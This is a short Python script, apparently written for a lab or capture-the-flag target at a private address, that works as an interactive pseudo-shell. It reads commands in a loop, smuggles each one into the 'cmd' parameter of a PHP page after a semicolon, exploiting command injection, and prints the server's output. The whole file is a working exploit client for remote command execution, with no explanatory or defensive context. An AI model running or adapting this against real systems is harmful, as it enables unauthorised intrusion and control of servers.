import requests


def run(cmd): 
    rsp = requests.get(f'http://10.10.1.10:2002/index.php?cmd=;{cmd}')
    print(rsp.text)

while True:
    cmd = input("ures> ")
    run(cmd)

